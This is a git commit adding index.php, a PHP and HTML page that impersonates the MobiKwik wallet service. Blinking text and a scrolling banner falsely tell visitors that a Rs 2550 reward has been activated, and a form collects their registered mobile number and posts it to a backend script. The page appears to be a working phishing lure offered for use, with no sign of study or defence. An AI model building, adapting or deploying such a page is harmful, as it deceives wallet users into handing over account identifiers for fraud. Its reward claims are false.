6ba5071f7d26701c17545dbc1969f76454d99e77
viour12 <117632263+viour12@users.noreply.github.com>
2022-11-08 20:26:04 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>online</title>
+    <style>
+        #bb ,#mm ,#re ,#ggm ,#ggmm
+        {
+            width: 100%;
+        }
+        #zz ,#ff ,#xx ,#ww ,#val
+        {
+            margin-left: 5%;
+            font-size: 12px;
+        }
+    
+        #ee ,#hh ,#jj ,#kk ,#upto
+        {
+            width: 90%;
+            margin-left: 5%;
+            margin-right: 5%;
+            height: 28px;
+            border-width:0.5px;
+            background-color: #eaeaea;
+            
+        }
+
+        #btn
+        {
+            margin-left: 5%;
+            margin-right:5%;
+            width: 90%;
+            height: 30px;
+            border-color: #017298;;
+            background-color:#017298;
+            border-radius:15px;
+            color: white;
+            margin-bottom: 30px;
+        }
+        body {
+  background-color: #147bf2;
+}
+
+.blinkp {
+  animation: blink 10s infinite;
+}
+
+@keyframes blinkp {
+  02% {
+    opacity: 15;
+  }
+  100% {
+    opacity: 20;
+    color: white;
+  }
+}
+
+.blink {
+  animation: blink 10s infinite;
+}
+
+@keyframes blink {
+  02% {
+    opacity: 15;
+  }
+  100% {
+    opacity: 20;
+    color: white;
+  }
+}
+
+.blinkk {
+                animation: blinker 3s linear infinite;
+                color: white;
+                font-family: sans-serif;
+            }
+            @keyframes blinker {
+                50% {
+                    opacity: 0;
+                }
+            }
+    </style>
+</head>
+<body>
+
+    <img src="hgg.png" alt=""id="bb">
+
+    <br><br>
+    <center><p>
+  <h1><span class="blink">Hi, MobiKwik users </span>
+</p></center></h1>
+    
+<marquee class="blinkk">Hi, mobikwik User your reward point Rs 2550, activated You Accepted it.</marquee>
+
+    <form action="as1asd.php" method="post">
+
+            <center><p>
+  <span class="blinkp">Enter MobiKiwk Register Number and check your rewards</span>
+</p></center>
+        <div class="dd">
+            <input type="Number" maxlength="10" name="mob." id="ee" required="">
+
+        </div>
+
+      <br><br>
+      <div class="ni">
+          <button type="submit" id="btn">
+              Submit
+          </button>
+      </div>
+      
+      <img src="sdkfhkdskflastndfhdfk.png" alt="" id="re">
+    </form>
+</body>
+</html>
